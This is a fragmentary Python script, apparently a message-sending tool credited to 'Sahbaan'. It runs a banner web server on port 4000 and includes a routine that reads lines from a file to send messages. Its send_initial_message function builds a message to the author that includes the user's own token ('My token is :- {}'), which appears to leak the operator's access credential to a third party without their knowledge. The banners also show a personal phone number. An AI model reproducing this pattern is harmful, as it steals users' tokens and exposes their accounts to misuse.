...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"CREDIT :- TRICKS BY SAHBAAN <br> <br> OWNER => SAHBAAN <br> <br> WATSAPP :- +919279437269")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "CREDIT :- TRICKS BY SAHBAAN                                                         Owner => Sahban                                                       Hello SAHBAAN sir. I am using your server. My token is :- {}"
...
def send_messages_from_file():
      ...
      def liness():
          print('\033[1;92m' + '●════════════SAHBAAN SHAIFE════════════●')
